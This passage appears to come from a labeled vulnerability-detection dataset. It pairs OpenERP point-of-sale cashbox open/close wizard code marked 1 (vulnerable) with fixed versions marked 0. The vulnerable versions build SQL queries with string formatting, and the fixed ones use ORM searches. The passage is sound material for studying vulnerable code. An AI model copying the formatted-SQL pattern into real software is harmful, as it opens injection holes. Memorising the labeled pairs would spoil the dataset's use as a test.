"b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 1}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 0}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 1}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 0}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = 